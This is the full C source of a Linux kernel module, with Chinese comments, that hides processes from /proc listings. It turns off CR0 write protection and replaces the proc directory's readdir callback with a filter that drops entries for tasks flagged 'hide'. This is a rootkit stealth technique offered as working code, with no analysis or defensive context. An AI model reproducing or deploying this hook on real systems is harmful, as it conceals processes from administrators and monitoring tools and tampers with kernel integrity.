#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/sched.h>
#include <linux/proc_fs.h>
#include <linux/fs.h>
#include <linux/file.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("CHS");
typedef int (*readdir_t)(struct file*, void *, filldir_t); 
readdir_t orig_proc_readdir = NULL;
filldir_t proc_filldir = NULL; 
/* 将字符串转换为整数，失败返回-1，成功返回大于-1的整数 */
int my_atoi(char * name)
{
	char *ptr;
	int tmp, pid = 0;
	int mul = 1;
	for (ptr = name + strlen(name) - 1; ptr >= name ; ptr--) {
		tmp = *ptr - '0';	
		if (tmp < 0 || tmp > 9) {
			pid = -1;
			break;
		}
		pid += tmp * mul;
		mul *= 10;	
	}
	return pid;
}
/* 检查一个进程是否要被隐藏 */
int is_invisible(int pid)
{	
	int res = 0;
	if (pid >= 0)  {//is a process		
		struct task_struct *task = pid_task(find_vpid(pid), PIDTYPE_PID);
		if (task != NULL) {
			res = task->hide;//1 for invisible, 0 for visible
		}
	}
	return res;
}
/* 目录填充函数 */
int hack_proc_filldir(void *buf, const char *name, int nlen, loff_t off, ino_t ino, unsigned x)
{
    char abuf[128];
    memset(abuf, 0, sizeof(abuf));
    memcpy(abuf, name, nlen < sizeof(abuf) ? nlen:sizeof(abuf)-1);
    if (is_invisible(my_atoi(abuf))) //should be hidden
       return 0;
    return proc_filldir(buf, name, nlen, off, ino, x);
}
/* 目录读取函数  */
int hack_proc_readdir(struct file *fp, void *buf, filldir_t filldir)
{
    int r=0;
    proc_filldir = filldir;
    r = orig_proc_readdir(fp, buf, hack_proc_filldir);
    return r;
}
/* 关闭写保护 */ 
inline unsigned long disable_wp()
{
       unsigned long cr0;
       preempt_disable();
       barrier();
       cr0 = read_cr0();
       write_cr0(cr0 & ~X86_CR0_WP);
       return cr0;
}
/* 恢复写保护  */
inline void restore_wp(unsigned long cr0)
{
       write_cr0(cr0);
       barrier();
       preempt_enable_no_resched();
}
/* 替换proc文件系统回调函数 */ 
int patch_proc(readdir_t *orig_readdir, readdir_t new_readdir)
{
    struct file_operations *new_op;
    struct file *filep;
    /* 打开/proc目录 */
    filep = filp_open("/proc", O_RDONLY, 0);
    if (IS_ERR(filep)) {
       printk(KERN_ALERT"cannot open file!\n");
       return -1;
    }
    if (orig_readdir)
       *orig_readdir = filep->f_op->readdir;
    /* 替换proc文件系统指针 */ 
    new_op = filep->f_op;
    new_op->readdir = new_readdir;
    filep->f_op = new_op;
    filp_close(filep, 0);
    return 0;
}                                
/* 恢复proc文件系统回调函数 */
int unpatch_proc(readdir_t orig_readdir)
{
    struct file_operations *new_op;
    struct file *filep;
    /* 打开/proc目录 */
    filep = filp_open("/proc", O_RDONLY, 0);
    if (IS_ERR(filep)) {
       printk(KERN_ALERT"cannot open file!\n");
       return -1;
    } 
    /* 恢复文件系统指针 */
    new_op = filep->f_op;
    new_op->readdir = orig_readdir;
    filep->f_op = new_op;
    filp_close(filep, 0);
    return 0;      
} 
/* 模块初始化函数 */
static int __init hack_proc_init(void)
{
       unsigned long orig_cr0 = disable_wp();
       patch_proc(&orig_proc_readdir, hack_proc_readdir);
       restore_wp(orig_cr0);
       printk(KERN_ALERT"Patch vfs done.\n");
       return 0;
}
/* 模块清理函数 */
static void __exit hack_proc_exit(void) 
{
       unsigned long orig_cr0 = disable_wp();
       unpatch_proc(orig_proc_readdir);
       restore_wp(orig_cr0);
       printk(KERN_ALERT"Unpatch vfs done.\n");
       return;
}
module_init(hack_proc_init);
module_exit(hack_proc_exit); 